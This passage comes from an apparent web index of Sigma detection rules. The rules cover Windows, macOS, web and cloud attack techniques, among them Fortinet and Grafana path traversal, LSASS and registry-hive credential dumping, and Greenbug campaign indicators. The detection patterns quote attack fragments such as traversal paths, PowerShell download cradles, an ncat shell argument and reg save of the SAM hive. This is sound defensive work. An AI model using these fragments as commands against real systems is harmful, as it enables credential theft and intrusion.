","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_smb_converted_win_lm_namedpipe.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"First Time Seen Remote Named Pipe - Zeek"},{"categories":null,"contents":"Detects the execution of format.com with a suspicious filesystem selection that could indicate a defense evasion activity in which format.com is used to load malicious DLL files or other programs\nKnown false-positives unknown References https://twitter.com/0gtweet/status/1477925112561209344 https://twitter.com/wdormann/status/1478011052130459653?s=20 Raw rule (edit) title: Format.com FileSystem LOLBIN id: 9fb6b26e-7f9e-4517-a48b-8cac4a1b6c60 status: experimental description: Detects the execution of format.com with a suspicious filesystem selection that could indicate a defense evasion activity in which format.com is used to load malicious DLL files or other programs author: Florian Roth date: 2022/01/04 references: - https://twitter.com/0gtweet/status/1477925112561209344 - https://twitter.com/wdormann/status/1478011052130459653?s=20 tags: - attack.defense_evasion logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\format.com\u0026#39; CommandLine|contains: \u0026#39;/fs:\u0026#39; filter: CommandLine|contains: - \u0026#39;/fs:FAT\u0026#39; - \u0026#39;/fs:exFAT\u0026#39; - \u0026#39;/fs:NTFS\u0026#39; - \u0026#39;/fs:UDF\u0026#39; - \u0026#39;/fs:ReFS\u0026#39; condition: selection and not 1 of filter* falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_format.yml/","tags":["attack.defense_evasion"],"title":"Format.com FileSystem LOLBIN"},{"categories":null,"contents":"Detects CVE-2018-13379 exploitation attempt against Fortinet SSL VPNs\nKnown false-positives Unknown References https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/ Raw rule (edit) title: Fortinet CVE-2018-13379 Exploitation id: a2e97350-4285-43f2-a63f-d0daff291738 status: test description: Detects CVE-2018-13379 exploitation attempt against Fortinet SSL VPNs author: Bhabesh Raj references: - https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/ date: 2020/12/08 modified: 2022/01/07 logsource: category: webserver detection: selection: c-uri|contains|all: - \u0026#39;lang=/../../\u0026#39; - \u0026#39;/dev/cmdb/sslvpn_websession\u0026#39; condition: selection fields: - client_ip - url - response falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_fortinet_cve_2018_13379_preauth_read_exploit.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Fortinet CVE-2018-13379 Exploitation"},{"categories":null,"contents":"A symbolic link is a type of file that contains a reference to another file. This is probably done to make sure that the ransomware is able to follow shortcuts on the machine in order to find the original file to encrypt\nKnown false-positives legitimate use References https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/fsutil-behavior Raw rule (edit) title: Fsutil Behavior Set SymlinkEvaluation id: c0b2768a-dd06-4671-8339-b16ca8d1f27f status: experimental description: | A symbolic link is a type of file that contains a reference to another file. This is probably done to make sure that the ransomware is able to follow shortcuts on the machine in order to find the original file to encrypt references: - https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware - https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/fsutil-behavior author: frack113 date: 2022/03/02 logsource: category: process_creation product: windows detection: selection: Image|endswith: fsutil.exe CommandLine|contains|all: - \u0026#39;behavior \u0026#39; - \u0026#39;set \u0026#39; - \u0026#39;SymlinkEvaluation\u0026#39; condition: selection falsepositives: - legitimate use level: medium tags: - attack.execution - attack.t1059 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_fsutil_symlinkevaluation.yml/","tags":["attack.execution","attack.t1059"],"title":"Fsutil Behavior Set SymlinkEvaluation"},{"categories":null,"contents":"Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc). Might be used by ransomwares during the attack (seen by NotPetya and others).\nKnown false-positives Admin activity Scripts and administrative tools used in the monitored environment References https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070/T1070.md https://eqllib.readthedocs.io/en/latest/analytics/c91f422a-5214-4b17-8664-c5fcf115c0a2.html Raw rule (edit) title: Fsutil Suspicious Invocation id: add64136-62e5-48ea-807e-88638d02df1e status: test description: Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc). Might be used by ransomwares during the attack (seen by NotPetya and others). author: Ecco, E.M. Anhaus, oscd.community references: - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070/T1070.md - https://eqllib.readthedocs.io/en/latest/analytics/c91f422a-5214-4b17-8664-c5fcf115c0a2.html date: 2019/09/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: binary_1: Image|endswith: \u0026#39;\\fsutil.exe\u0026#39; binary_2: OriginalFileName: \u0026#39;fsutil.exe\u0026#39; selection: CommandLine|contains: - \u0026#39;deletejournal\u0026#39; # usn deletejournal ==\u0026gt; generally ransomware or attacker - \u0026#39;createjournal\u0026#39; # usn createjournal ==\u0026gt; can modify config to set it to a tiny size condition: (1 of binary_*) and selection falsepositives: - Admin activity - Scripts and administrative tools used in the monitored environment level: high tags: - attack.defense_evasion - attack.t1070 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_fsutil_usage.yml/","tags":["attack.defense_evasion","attack.t1070"],"title":"Fsutil Suspicious Invocation"},{"categories":null,"contents":"Detects artefacts associated with activity group GALLIUM - Microsoft Threat Intelligence Center indicators released in December 2019.\nKnown false-positives unknown References https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/ https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800669(v=ws.11) Raw rule (edit) title: GALLIUM Artefacts id: 440a56bf-7873-4439-940a-1c8a671073c2 status: experimental description: Detects artefacts associated with activity group GALLIUM - Microsoft Threat Intelligence Center indicators released in December 2019. author: Tim Burrell date: 2020/02/07 modified: 2021/09/19 references: - https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/ - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800669(v=ws.11) tags: - attack.credential_access - attack.t1212 - attack.command_and_control - attack.t1071 logsource: product: windows category: process_creation detection: exec_selection: sha1: - \u0026#39;53a44c2396d15c3a03723fa5e5db54cafd527635\u0026#39; - \u0026#39;9c5e496921e3bc882dc40694f1dcc3746a75db19\u0026#39; - \u0026#39;aeb573accfd95758550cf30bf04f389a92922844\u0026#39; - \u0026#39;79ef78a797403a4ed1a616c68e07fff868a8650a\u0026#39; - \u0026#39;4f6f38b4cec35e895d91c052b1f5a83d665c2196\u0026#39; - \u0026#39;1e8c2cac2e4ce7cbd33c3858eb2e24531cb8a84d\u0026#39; - \u0026#39;e841a63e47361a572db9a7334af459ddca11347a\u0026#39; - \u0026#39;c28f606df28a9bc8df75a4d5e5837fc5522dd34d\u0026#39; - \u0026#39;2e94b305d6812a9f96e6781c888e48c7fb157b6b\u0026#39; - \u0026#39;dd44133716b8a241957b912fa6a02efde3ce3025\u0026#39; - \u0026#39;8793bf166cb89eb55f0593404e4e933ab605e803\u0026#39; - \u0026#39;a39b57032dbb2335499a51e13470a7cd5d86b138\u0026#39; - \u0026#39;41cc2b15c662bc001c0eb92f6cc222934f0beeea\u0026#39; - \u0026#39;d209430d6af54792371174e70e27dd11d3def7a7\u0026#39; - \u0026#39;1c6452026c56efd2c94cea7e0f671eb55515edb0\u0026#39; - \u0026#39;c6b41d3afdcdcaf9f442bbe772f5da871801fd5a\u0026#39; - \u0026#39;4923d460e22fbbf165bbbaba168e5a46b8157d9f\u0026#39; - \u0026#39;f201504bd96e81d0d350c3a8332593ee1c9e09de\u0026#39; - \u0026#39;ddd2db1127632a2a52943a2fe516a2e7d05d70d2\u0026#39; condition: exec_selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_gallium_sha1.yml/","tags":["attack.credential_access","attack.t1212","attack.command_and_control","attack.t1071"],"title":"GALLIUM Artefacts"},{"categories":null,"contents":"Detects macOS Gatekeeper bypass via xattr utility\nKnown false-positives Legitimate activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.001/T1553.001.md Raw rule (edit) title: Gatekeeper Bypass via Xattr id: f5141b6d-9f42-41c6-a7bf-2a780678b29b status: test description: Detects macOS Gatekeeper bypass via xattr utility author: Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.001/T1553.001.md date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image|endswith: \u0026#39;/xattr\u0026#39; CommandLine|contains|all: - \u0026#39;-r\u0026#39; - \u0026#39;com.apple.quarantine\u0026#39; condition: selection falsepositives: - Legitimate activities level: low tags: - attack.defense_evasion - attack.t1553.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_xattr_gatekeeper_bypass.yml/","tags":["attack.defense_evasion","attack.t1553.001"],"title":"Gatekeeper Bypass via Xattr"},{"categories":null,"contents":"Adversaries can abuse of C:\\Windows\\System32\\gatherNetworkInfo.vbs script along with cscript.exe to gather information about the target\nKnown false-positives Administrative activity References https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs Raw rule (edit) title: GatherNetworkInfo.vbs Script Usage id: 575dce0c-8139-4e30-9295-1ee75969f7fe description: Adversaries can abuse of C:\\Windows\\System32\\gatherNetworkInfo.vbs script along with cscript.exe to gather information about the target status: experimental references: - https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs author: blueteamer8699 date: 2022/01/03 tags: - attack.discovery - attack.group_policy_discovery - attack.execution - attack.command_and_scripting_interpreter - attack.visual_basic - attack.t1059.005 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;cscript.exe\u0026#39; - \u0026#39;gatherNetworkInfo.vbs\u0026#39; condition: selection falsepositives: - Administrative activity fields: - CommandLine - ParentImage level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbin_cscript_gathernetworkinfo.yml/","tags":["attack.discovery","attack.group_policy_discovery","attack.execution","attack.command_and_scripting_interpreter","attack.visual_basic","attack.t1059.005"],"title":"GatherNetworkInfo.vbs Script Usage"},{"categories":null,"contents":"Detects process handle on LSASS process with certain access mask\nKnown false-positives Legitimate software accessing LSASS process for legitimate reason; update the whitelist with it References https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment Raw rule (edit) title: Generic Password Dumper Activity on LSASS id: 4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76 description: Detects process handle on LSASS process with certain access mask status: experimental author: Roberto Rodriguez, Teymur Kheirkhabarov, Dimitrios Slamaris, Mark Russinovich, Aleksey Potapov, oscd.community (update) date: 2019/11/01 modified: 2021/11/22 references: - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment tags: - attack.credential_access - car.2019-04-004 - attack.t1003.001 logsource: product: windows service: security detection: selection_1: EventID: 4656 ObjectName|endswith: \u0026#39;\\lsass.exe\u0026#39; AccessMask|contains: - \u0026#39;0x40\u0026#39; - \u0026#39;0x1400\u0026#39; # - \u0026#39;0x1000\u0026#39; # minimum access requirements to query basic info from service - \u0026#39;0x100000\u0026#39; - \u0026#39;0x1410\u0026#39; # car.2019-04-004 - \u0026#39;0x1010\u0026#39; # car.2019-04-004 - \u0026#39;0x1438\u0026#39; # car.2019-04-004 - \u0026#39;0x143a\u0026#39; # car.2019-04-004 - \u0026#39;0x1418\u0026#39; # car.2019-04-004 - \u0026#39;0x1f0fff\u0026#39; - \u0026#39;0x1f1fff\u0026#39; - \u0026#39;0x1f2fff\u0026#39; - \u0026#39;0x1f3fff\u0026#39; selection_2: EventID: 4663 ObjectName|endswith: \u0026#39;\\lsass.exe\u0026#39; AccessList|contains: - \u0026#39;4484\u0026#39; - \u0026#39;4416\u0026#39; filter1: ProcessName|endswith: - \u0026#39;\\wmiprvse.exe\u0026#39; - \u0026#39;\\taskmgr.exe\u0026#39; - \u0026#39;\\procexp64.exe\u0026#39; - \u0026#39;\\procexp.exe\u0026#39; - \u0026#39;\\lsm.exe\u0026#39; - \u0026#39;\\csrss.exe\u0026#39; - \u0026#39;\\wininit.exe\u0026#39; - \u0026#39;\\vmtoolsd.exe\u0026#39; - \u0026#39;\\minionhost.exe\u0026#39; # Cyberreason - \u0026#39;\\VsTskMgr.exe\u0026#39; # McAfee Enterprise - \u0026#39;\\thor64.exe\u0026#39; # THOR - \u0026#39;\\MicrosoftEdgeUpdate.exe\u0026#39; - \u0026#39;\\GamingServices.exe\u0026#39; - \u0026#39;\\svchost.exe\u0026#39; - \u0026#39;\\MsMpEng.exe\u0026#39; # Defender ProcessName|startswith: - C:\\Windows\\System32\\ - C:\\Windows\\SysWow64\\ - C:\\Windows\\SysNative\\ - C:\\Program Files\\ - C:\\Windows\\Temp\\asgard2-agent\\ - C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\ filter2: ProcessName|startswith: - \u0026#39;C:\\Program Files\u0026#39; # too many false positives with legitimate AV and EDR solutions condition: 1 of selection_* and not 1 of filter* fields: - ComputerName - SubjectDomainName - SubjectUserName - ProcessName - ProcessID falsepositives: - Legitimate software accessing LSASS process for legitimate reason; update the whitelist with it level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_lsass_dump_generic.yml/","tags":["attack.credential_access","car.2019-04-004","attack.t1003.001"],"title":"Generic Password Dumper Activity on LSASS"},{"categories":null,"contents":"Detects when GfxDownloadWrapper.exe downloads file from non standard URL\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/GfxDownloadWrapper.yml Raw rule (edit) title: GfxDownloadWrapper.exe Downloads File from Suspicious URL id: eee00933-a761-4cd0-be70-c42fe91731e7 status: test description: Detects when GfxDownloadWrapper.exe downloads file from non standard URL author: Victor Sergeev, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/GfxDownloadWrapper.yml date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: image_path: Image|endswith: \u0026#39;\\GfxDownloadWrapper.exe\u0026#39; cmd_known_url: CommandLine|contains: \u0026#39;gameplayapi.intel.com\u0026#39; same_parent: ParentImage|endswith: \u0026#39;\\GfxDownloadWrapper.exe\u0026#39; condition: image_path and not cmd_known_url and not same_parent fields: - CommandLine falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_file_download_via_gfxdownloadwrapper.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"GfxDownloadWrapper.exe Downloads File from Suspicious URL"},{"categories":null,"contents":"Detects the creation or patching of potential malicious RoleBinding. This includes RoleBindings and ClusterRoleBinding.\nKnown false-positives RoleBindings and ClusterRoleBinding being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. RoleBindings and ClusterRoleBinding modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://github.com/elastic/detection-rules/pull/1267 https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/cluster-role-v1/#ClusterRole https://cloud.google.com/kubernetes-engine/docs/how-to/role-based-access-control https://kubernetes.io/docs/reference/access-authn-authz/rbac/ https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging Raw rule (edit) title: Google Cloud Kubernetes RoleBinding id: 0322d9f2-289a-47c2-b5e1-b63c90901a3e description: Detects the creation or patching of potential malicious RoleBinding. This includes RoleBindings and ClusterRoleBinding. author: Austin Songer @austinsonger status: experimental date: 2021/08/09 references: - https://github.com/elastic/detection-rules/pull/1267 - https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/cluster-role-v1/#ClusterRole - https://cloud.google.com/kubernetes-engine/docs/how-to/role-based-access-control - https://kubernetes.io/docs/reference/access-authn-authz/rbac/ - https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - io.k8s.authorization.rbac.v*.clusterrolebindings.create - io.k8s.authorization.rbac.v*.rolebindings.create - io.k8s.authorization.rbac.v*.clusterrolebindings.patch - io.k8s.authorization.rbac.v*.rolebindings.patch - io.k8s.authorization.rbac.v*.clusterrolebindings.update - io.k8s.authorization.rbac.v*.rolebindings.update - io.k8s.authorization.rbac.v*.clusterrolebindings.delete - io.k8s.authorization.rbac.v*.rolebindings.delete condition: selection level: medium tags: - attack.credential_access falsepositives: - RoleBindings and ClusterRoleBinding being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - RoleBindings and ClusterRoleBinding modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_kubernetes_rolebinding.yml/","tags":["attack.credential_access"],"title":"Google Cloud Kubernetes RoleBinding"},{"categories":null,"contents":"Identifies when the Secrets are Modified or Deleted.\nKnown false-positives Secrets being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Secrets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging Raw rule (edit) title: Google Cloud Kubernetes Secrets Modified or Deleted id: 2f0bae2d-bf20-4465-be86-1311addebaa3 description: Identifies when the Secrets are Modified or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/09 references: - https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - io.k8s.core.v*.secrets.create - io.k8s.core.v*.secrets.update - io.k8s.core.v*.secrets.patch - io.k8s.core.v*.secrets.delete condition: selection level: medium tags: - attack.credential_access falsepositives: - Secrets being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Secrets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_kubernetes_secrets_modified_or_deleted.yml/","tags":["attack.credential_access"],"title":"Google Cloud Kubernetes Secrets Modified or Deleted"},{"categories":null,"contents":"Dump sam, system or security hives using REG.exe utility\nKnown false-positives Dumping hives for legitimate purpouse i.e. backup or forensic investigation References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment https://eqllib.readthedocs.io/en/latest/analytics/aed95fc6-5e3f-49dc-8b35-06508613f979.html https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation Raw rule (edit) title: Grabbing Sensitive Hives via Reg Utility id: fd877b94-9bb5-4191-bb25-d79cbd93c167 status: test description: Dump sam, system or security hives using REG.exe utility author: Teymur Kheirkhabarov, Endgame, JHasenbusch, Daniil Yugoslavskiy, oscd.community references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment - https://eqllib.readthedocs.io/en/latest/analytics/aed95fc6-5e3f-49dc-8b35-06508613f979.html - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md - https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation date: 2019/10/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: \u0026#39;\\reg.exe\u0026#39; CommandLine|contains: - \u0026#39;save\u0026#39; - \u0026#39;export\u0026#39; - \u0026#39;ˢave\u0026#39; - \u0026#39;eˣport\u0026#39; selection_2: CommandLine|contains: - \u0026#39;hklm\u0026#39; - \u0026#39;hk˪m\u0026#39; - \u0026#39;hkey_local_machine\u0026#39; - \u0026#39;hkey_˪ocal_machine\u0026#39; - \u0026#39;hkey_loca˪_machine\u0026#39; - \u0026#39;hkey_˪oca˪_machine\u0026#39; selection_3: CommandLine|endswith: - \u0026#39;\\system\u0026#39; - \u0026#39;\\sam\u0026#39; - \u0026#39;\\security\u0026#39; - \u0026#39;\\ˢystem\u0026#39; - \u0026#39;\\syˢtem\u0026#39; - \u0026#39;\\ˢyˢtem\u0026#39; - \u0026#39;\\ˢam\u0026#39; - \u0026#39;\\ˢecurity\u0026#39; condition: selection_1 and selection_2 and selection_3 falsepositives: - Dumping hives for legitimate purpouse i.e. backup or forensic investigation level: medium tags: - attack.credential_access - attack.t1003.002 - attack.t1003.004 - attack.t1003.005 - car.2013-07-001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_grabbing_sensitive_hives_via_reg.yml/","tags":["attack.credential_access","attack.t1003.002","attack.t1003.004","attack.t1003.005","car.2013-07-001"],"title":"Grabbing Sensitive Hives via Reg Utility"},{"categories":null,"contents":"Detects a successful Grafana path traversal exploitation\nKnown false-positives Vulnerability scanners that scan a host that returns 200 status codes even in cases of a file not found or other error References https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/ https://github.com/search?q=CVE-2021-43798 Raw rule (edit) title: Grafana Path Traversal Exploitation CVE-2021-43798 id: 7b72b328-5708-414f-9a2a-6a6867c26e16 status: experimental description: Detects a successful Grafana path traversal exploitation author: Florian Roth references: - https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/ - https://github.com/search?q=CVE-2021-43798 date: 2021/12/08 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection_traversal: c-uri|contains: \u0026#39;/../../../../../../../\u0026#39; sc-status: 200 selection_plugins: c-uri|contains: - \u0026#39;/public/plugins/live\u0026#39; - \u0026#39;/public/plugins/icon\u0026#39; - \u0026#39;/public/plugins/loki\u0026#39; - \u0026#39;/public/plugins/text\u0026#39; - \u0026#39;/public/plugins/logs\u0026#39; - \u0026#39;/public/plugins/news\u0026#39; - \u0026#39;/public/plugins/stat\u0026#39; - \u0026#39;/public/plugins/mssql\u0026#39; - \u0026#39;/public/plugins/mixed\u0026#39; - \u0026#39;/public/plugins/mysql\u0026#39; - \u0026#39;/public/plugins/tempo\u0026#39; - \u0026#39;/public/plugins/graph\u0026#39; - \u0026#39;/public/plugins/gauge\u0026#39; - \u0026#39;/public/plugins/table\u0026#39; - \u0026#39;/public/plugins/debug\u0026#39; - \u0026#39;/public/plugins/zipkin\u0026#39; - \u0026#39;/public/plugins/jaeger\u0026#39; - \u0026#39;/public/plugins/geomap\u0026#39; - \u0026#39;/public/plugins/canvas\u0026#39; - \u0026#39;/public/plugins/grafana\u0026#39; - \u0026#39;/public/plugins/welcome\u0026#39; - \u0026#39;/public/plugins/xychart\u0026#39; - \u0026#39;/public/plugins/heatmap\u0026#39; - \u0026#39;/public/plugins/postgres\u0026#39; - \u0026#39;/public/plugins/testdata\u0026#39; - \u0026#39;/public/plugins/opentsdb\u0026#39; - \u0026#39;/public/plugins/influxdb\u0026#39; - \u0026#39;/public/plugins/barchart\u0026#39; - \u0026#39;/public/plugins/annolist\u0026#39; - \u0026#39;/public/plugins/bargauge\u0026#39; - \u0026#39;/public/plugins/graphite\u0026#39; - \u0026#39;/public/plugins/dashlist\u0026#39; - \u0026#39;/public/plugins/piechart\u0026#39; - \u0026#39;/public/plugins/dashboard\u0026#39; - \u0026#39;/public/plugins/nodeGraph\u0026#39; - \u0026#39;/public/plugins/alertlist\u0026#39; - \u0026#39;/public/plugins/histogram\u0026#39; - \u0026#39;/public/plugins/table-old\u0026#39; - \u0026#39;/public/plugins/pluginlist\u0026#39; - \u0026#39;/public/plugins/timeseries\u0026#39; - \u0026#39;/public/plugins/cloudwatch\u0026#39; - \u0026#39;/public/plugins/prometheus\u0026#39; - \u0026#39;/public/plugins/stackdriver\u0026#39; - \u0026#39;/public/plugins/alertGroups\u0026#39; - \u0026#39;/public/plugins/alertmanager\u0026#39; - \u0026#39;/public/plugins/elasticsearch\u0026#39; - \u0026#39;/public/plugins/gettingstarted\u0026#39; - \u0026#39;/public/plugins/state-timeline\u0026#39; - \u0026#39;/public/plugins/status-history\u0026#39; - \u0026#39;/public/plugins/grafana-clock-panel\u0026#39; - \u0026#39;/public/plugins/grafana-simple-json-datasource\u0026#39; - \u0026#39;/public/plugins/grafana-azure-monitor-datasource\u0026#39; condition: all of selection* fields: - c-ip - c-dns falsepositives: - Vulnerability scanners that scan a host that returns 200 status codes even in cases of a file not found or other error level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_43798_grafana.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Grafana Path Traversal Exploitation CVE-2021-43798"},{"categories":null,"contents":"Detects tools and process executions as observed in a Greenbug campaign in May 2020\nKnown false-positives Unknown References https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia Raw rule (edit) title: Greenbug Campaign Indicators id: 3711eee4-a808-4849-8a14-faf733da3612 status: test description: Detects tools and process executions as observed in a Greenbug campaign in May 2020 references: - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia author: Florian Roth date: 2020/05/20 modified: 2021/09/21 tags: - attack.g0049 - attack.execution - attack.t1059.001 - attack.command_and_control - attack.t1105 - attack.defense_evasion - attack.t1036.005 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - \u0026#39;bitsadmin\u0026#39; - \u0026#39;/transfer\u0026#39; - \u0026#39;CSIDL_APPDATA\u0026#39; selection2: CommandLine|contains: - \u0026#39;CSIDL_SYSTEM_DRIVE\u0026#39; selection3: CommandLine|contains: - \u0026#39;\\msf.ps1\u0026#39; - \u0026#39;8989 -e cmd.exe\u0026#39; - \u0026#39;system.Data.SqlClient.SqlDataAdapter($cmd); [void]$da.fill\u0026#39; - \u0026#39;-nop -w hidden -c $k=new-object\u0026#39; - \u0026#39;[Net.CredentialCache]::DefaultCredentials;IEX \u0026#39; - \u0026#39; -nop -w hidden -c $m=new-object net.webclient;$m\u0026#39; - \u0026#39;-noninteractive -executionpolicy bypass whoami\u0026#39; - \u0026#39;-noninteractive -executionpolicy bypass netstat -a\u0026#39; - \u0026#39;L3NlcnZlcj1\u0026#39; # base64 encoded \u0026#39;/server=\u0026#39; selection4: Image|endswith: - \u0026#39;\\adobe\\Adobe.exe\u0026#39; - \u0026#39;\\oracle\\local.exe\u0026#39; - \u0026#39;\\revshell.exe\u0026#39; - \u0026#39;infopagesbackup\\ncat.exe\u0026#39; - \u0026#39;CSIDL_SYSTEM\\cmd.exe\u0026#39; - \u0026#39;\\programdata\\oracle\\java.exe\u0026#39; - \u0026#39;CSIDL_COMMON_APPDATA\\comms\\comms.exe\u0026#39; - \u0026#39;\\Programdata\\VMware\\Vmware.exe\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_greenbug_may20.yml/","tags":["attack.g0049","attack.execution","attack.t1059.001","attack.command_and_control","attack.t1105","attack.defense_evasion","attack.t1036.005"],"title":"Greenbug Campaign Indicators"},{"categories":null,"contents":"Detects suspicious session with two users present\nKnown false-positives Unknown References https://research.checkpoint.com/2020/apache-guacamole-rce/ Raw rule (edit) title: Guacamole Two Users Sharing Session Anomaly id: 1edd77db-0669-4fef-9598-165bda82826d status: test description: Detects suspicious session with two users present author: Florian Roth references: - https://research.checkpoint.com/2020/apache-guacamole-rce/ date: 2020/07/03 modified: 2021/11/27 logsource: product: linux service: guacamole detection: selection: - \u0026#39;(2 users now present)\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1212 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/other/lnx_susp_guacamole.yml/","tags":["attack.credential_access","attack.t1212"],"title":"Guacamole Two Users Sharing Session Anomaly"},{"categories":null,"contents":"Detects attempts to use system dialog prompts to capture user credentials\nKnown false-positives Legitimate administration tools and activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md https://scriptingosx.com/2018/08/user-interaction-from-bash-scripts/ Raw rule (edit) title: GUI Input Capture - macOS id: 60f1ce20-484e-41bd-85f4-ac4afec2c541 status: experimental description: Detects attempts to use system dialog prompts to capture user credentials author: remotephone, oscd.community date: 2020/10/13 modified: 2021/12/02 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md - https://scriptingosx.com/2018/08/user-interaction-from-bash-scripts/ logsource: product: macos category: process_creation detection: selection1: Image: - \u0026#39;/usr/sbin/osascript\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;-e\u0026#39; - \u0026#39;display\u0026#39; - \u0026#39;dialog\u0026#39; - \u0026#39;answer\u0026#39; selection3: CommandLine|contains: - \u0026#39;admin\u0026#39; - \u0026#39;administrator\u0026#39; - \u0026#39;authenticate\u0026#39; - \u0026#39;authentication\u0026#39; - \u0026#39;credentials\u0026#39; - \u0026#39;pass\u0026#39; - \u0026#39;password\u0026#39; - \u0026#39;unlock\u0026#39; condition: all 